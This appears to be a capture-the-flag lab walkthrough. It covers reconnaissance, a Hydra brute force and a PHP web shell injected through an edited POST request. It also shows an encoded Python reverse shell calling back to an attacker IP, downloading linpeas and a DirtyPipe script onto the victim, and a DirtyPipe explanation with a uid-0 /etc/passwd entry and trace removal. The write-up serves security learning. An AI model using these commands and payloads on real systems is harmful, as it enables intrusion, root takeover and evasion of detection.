1. Detect which devices are online on the same subnet.
    ```bash
    sudo netdiscover -i eth0
    ```
    ![image](https://hackmd.io/_uploads/H1Vsfq48le.png)
2. Scan the IP.
    ```bash
    nmap 192.168.101.129 -sV
    ```
    ![image](https://hackmd.io/_uploads/HJAJ79NIxl.png)
3. View the web page.
    ```bash
    curl -i http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/HkRQQqEIge.png)
4. Use `nikto` to scan the Apache service (port 80).
    ```bash
    nikto -h http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/ryy5X54Ilx.png)
5. Enumerate directories and files.
    ```bash
    gobuster dir -u http://192.168.101.129 -w /usr/share/wordlists/dirb/common.txt
    ```
    * However, `robots.txt` and the `jquery` directory contained nothing useful.
6. Use Hydra to brute-force the HTTP GET login form.
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.101.129:80 -V
    ```
    ![image](https://hackmd.io/_uploads/Hyog9qELxx.png)
    * `http-get` indicates the target is an HTTP service using GET requests.
    * `-l admin` sets the username to `admin`.
    * `-P` uses `rockyou.txt` as the password dictionary.
    * `-V` shows the detailed trial process.
    * In the end, no valid login page was found.
7. Brute-force directories. `-x php,html,txt` specifies the file extensions to test: PHP, HTML, and TXT.
    ```bash
    gobuster dir -u http://192.168.101.129:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
    ```
    ![image](https://hackmd.io/_uploads/HyR_h24Lgg.png)
8. View `graffiti.txt`.
    ![image](https://hackmd.io/_uploads/BJ_jTnNLeg.png)
    * We discover that text entered in the form is displayed above in `graffiti.txt`.
9. Intercept and modify the POST request with Burp.
    ![image](https://hackmd.io/_uploads/rJ_mHa4Llg.png)
    * Use `<?php phpinfo(); ?>` as a test to see if injection works.
    * Because spaces may trigger PHP filtering or parsing failures, use the encoded version: `message=%3C%3Fphp%20phpinfo()%3B%20%3F%3E&file=shell.php`
10. A `phpinfo` page appears successfully.
    ![image](https://hackmd.io/_uploads/SkDXITNIee.png)
11. Begin injecting a reverse shell.
    ![image](https://hackmd.io/_uploads/H1Fj6648ex.png)
    ![image](https://hackmd.io/_uploads/Byg10aNIel.png)
    * Use `<?php system($_GET['cmd']); ?>`.
12. Send commands so that the attacker's listener receives a connection.
    ```bash
    http://192.168.101.129/shell6.php?cmd=echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMDEuMTI4Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYX[...]
    ```
    The decoded command is:
    ```python
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.101.128",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
    ```
    * `192.168.101.128` is the attacker's IP.

    Listener success:
    ![image](https://hackmd.io/_uploads/rk6UE0VIlx.png)
13. Get an interactive shell.
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
    export TERM=xterm-256color
    alias ll='ls -lsaht --color=auto'
    Ctrl + Z [background process]
    stty raw -echo ; fg ; reset
    stty columns 200 rows 200
    ```
    ![image](https://hackmd.io/_uploads/HJKssxB8gg.png)
14. Upload the attacker's `linpeas.sh` and run it on the victim to scan for vulnerabilities.
    ![image](https://hackmd.io/_uploads/rkqDy1SIee.png)
    ```bash
    # On the attacker side
    python -m http.server
    # On the victim side
    wget 192.168.101.128:8000/Desktop/linpeas.sh -O /tmp/linpeas.sh
    # Make it executable
    chmod +x linpeas.sh.1
    # Run it
    ./linpeas.sh.1
    ```
15. Use the vulnerability found by `linpeas` for privilege escalation.
    * Potential vulnerabilities:
      `CVE-2021-3490` (eBPF ALU32 bounds tracking): may be exploitable for privilege escalation.
      `CVE-2022-0847` (DirtyPipe): a very powerful vulnerability allowing direct escalation.
      `CVE-2021-3156` (sudo Baron Samedit): if the sudo version matches, it can be exploited.
    ![image](https://hackmd.io/_uploads/BkL2A1SUxe.png)
    Download `Dirty-Pipe.sh` from the attacker and execute it on the victim.
    ![image](https://hackmd.io/_uploads/S1kOleBIel.png)
    ```bash
    # Download from attacker
    wget 192.168.101.128:8000/Desktop/CVE/Dirty-Pipe.sh -o /tmp/DirtyPipe
    # Make executable
    chmod +x Dirty-Pipe.sh
    # Run it
    bash Dirty-Pipe.sh
    # Verify identity
    whoami
    ```
16. Read the flag.
    ![image](https://hackmd.io/_uploads/HJJrGeBUgl.png)

---

### DirtyPipe privilege escalation logic
1. **Background**:
   - DirtyPipe is a vulnerability in the Linux pipe implementation affecting kernel versions 5.8 and above.
   - It allows an attacker to write to arbitrary files through a pipe even if the file is read-only.

2. **Exploitation steps**:
   - **Create a pipe**:
     The attacker creates a pipe and writes data into it.
   - **Target the file**:
     Use a file descriptor to open the target file, such as `/etc/passwd`.
   - **Overwrite file contents**:
     Use the DirtyPipe bug to inject malicious data into a specific location within the file.

3. **Privilege escalation**:
   - Modify `/etc/passwd` by adding a user with `root` privileges.
     Example:
     ```bash
     rootkit:x:0:0:root:/root:/bin/bash
     ```
   - Log in as that new user and gain root access.

4. **Cleanup**:
   - Back up the original file and restore it after exploitation to avoid crashes or detection.

---

### Core logic of the DirtyPipe escalation script
1. **Back up `/etc/passwd`**:
   - Prevent modification failure from breaking the system.
2. **Use the vulnerability to write malicious data**:
   - Inject the malicious user entry into `/etc/passwd`.
3. **Switch to the new user**:
   - Log in as the new user to obtain root privileges.
4. **Remove traces**:
   - Restore `/etc/passwd`, delete the script, and clean up temporary files.

---

### Impact of DirtyPipe
- Unprivileged users can directly gain root access.
- Attackers can modify system files, including configuration files.
- Affects all Linux systems running affected kernel versions.
